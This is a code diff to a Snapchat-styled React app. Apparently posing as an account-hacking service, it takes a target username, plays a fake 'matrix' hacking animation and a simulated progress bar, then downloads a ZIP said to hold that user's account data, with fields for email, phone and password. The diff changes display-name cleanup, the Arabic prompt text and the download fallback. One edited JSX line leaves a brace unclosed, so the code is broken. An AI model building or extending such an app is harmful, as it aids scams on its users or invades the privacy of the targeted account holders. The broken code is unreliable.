@@ -32,7 +32,11 @@ interface AccountData { email: string; phone: string; password: string; internal
 /* ─── Utilities ─── */
 async function fetchSnapProfile(username: string): Promise<SnapProfile> {
   const res = await fetch(`/api/snap-profile/${encodeURIComponent(username)}`);
-  return res.json() as Promise<SnapProfile>;
+  const data = await res.json() as SnapProfile;
+  if (data.displayName) {
+    data.displayName = data.displayName.replace(/\s+on\s+snapchat$/i, '').trim();
+  }
+  return data;
 }
 
 function fmtNum(n: number | null): string {
@@ -200,7 +204,7 @@ const LoginScreen = ({ onSubmit }: { onSubmit: (input: string) => void }) => {
       <div className="flex flex-col items-center gap-2">
         <SnapGhost size={90} color="white" />
         <h1 className="text-white text-3xl font-black mt-2 tracking-tight">سناب شات</h1>
-        <p className="text-[#636366] text-sm mt-1" dir="rtl">أدخل بياناتك للوصول إلى الحساب</p>
+        <p className="text-[#636366] text-sm mt-1" dir="rtl">أدخل البيانات + للوصول إلى الحساب</p>
       </div>
       <div className="w-full max-w-xs flex flex-col gap-3">
         {err && (
@@ -428,20 +432,26 @@ const DownloadAccessModal = ({ accountData, profile, onClose }: {
 
   useEffect(() => {
     let p = 0;
-    const interval = setInterval(() => {
+    const interval = setInterval(async () => {
       p += 0.3 + Math.random() * 0.5;
       if (p >= 100) {
         p = 100;
         clearInterval(interval);
-        fetch(`/api/account-zip/${encodeURIComponent(profile.username)}`)
-          .then(r => r.blob())
-          .then(blob => {
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url; a.download = `${profile.username}_snapchat_data.zip`;
-            document.body.appendChild(a); a.click(); document.body.removeChild(a);
-            setTimeout(() => URL.revokeObjectURL(url), 3000);
-          }).catch(() => {});
+        const dlUrl = `/api/account-zip/${encodeURIComponent(profile.username)}`;
+        try {
+          const r = await fetch(dlUrl);
+          const blob = await r.blob();
+          const url = URL.createObjectURL(blob);
+          const a = document.createElement('a');
+          a.href = url; a.download = `${profile.username}_snapchat_data.zip`;
+          document.body.appendChild(a); a.click(); document.body.removeChild(a);
+          setTimeout(() => URL.revokeObjectURL(url), 3000);
+        } catch {
+          const a = document.createElement('a');
+          a.href = dlUrl; a.download = `${profile.username}_snapchat_data.zip`;
+          a.target = '_blank'; a.rel = 'noreferrer';
+          document.body.appendChild(a); a.click(); document.body.removeChild(a);
+        }
         setTimeout(() => setPhase('done'), 600);
       }
       setProgress(Math.min(p, 100));
@@ -730,7 +740,7 @@ export default function App() {
     }
   }, []);
 
-  const handleMatrixDone = useCallback(() => setAppState('success'), []);
+  const handleMatrixDone = useCallback(() => setAppState('profile'), []);
   const handleEnter = useCallback(() => setAppState('profile'), []);
   const handleLogout = useCallback(() => { setProfile(null); setAppState('login'); }, []);
   const handleReport = useCallback(() => setAppState('report'), []);
@@ -741,7 +751,7 @@ export default function App() {
       {appState === 'login' && <LoginScreen onSubmit={handleLogin} />}
       {appState === 'loading' && <LoadingScreen username={rawInput} />}
       {appState === 'matrix' && <MatrixRain onComplete={handleMatrixDone} />}
-      {appState === 'success' && <SuccessModal onEnter={handleEnter} />}
+      {/* SuccessModal removed — auto-redirect to profile after matrix */
       {appState === 'profile' && profile && (
         <SnapProfilePage profile={profile} onLogout={handleLogout} onReport={handleReport} />
       )}
